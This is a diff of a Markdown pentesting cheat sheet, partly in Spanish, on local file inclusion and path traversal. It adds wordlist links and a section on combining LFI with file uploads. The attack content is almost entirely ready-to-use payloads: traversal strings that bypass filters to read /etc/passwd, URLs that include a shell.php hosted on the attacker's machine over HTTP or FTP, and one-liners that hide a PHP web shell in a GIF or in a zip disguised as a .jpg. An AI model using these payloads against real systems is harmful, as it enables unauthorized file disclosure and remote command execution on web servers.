@@ -1,7 +1,9 @@
 # LFI & Path Traversal
 
 ## LFI
-- [Paylaods Fuzzing](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
+- [Payloads Fuzzing](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)
+    - [An other one but for linux paths](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
+    - [Windows paths](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
 - Ejemplo para bypassear filtros: `....//....//....//....//etc/passwd`
 - Encodearlo en URL también sirve: `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
 
@@ -32,3 +34,12 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 - `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
 - con ftp `python3 -m pyftpdlib -p 21`
 - `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
+
+## LFI + File upload
+
+### Mediante una imagen
+- `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
+
+### Zip upload
+- `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`
+- `http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
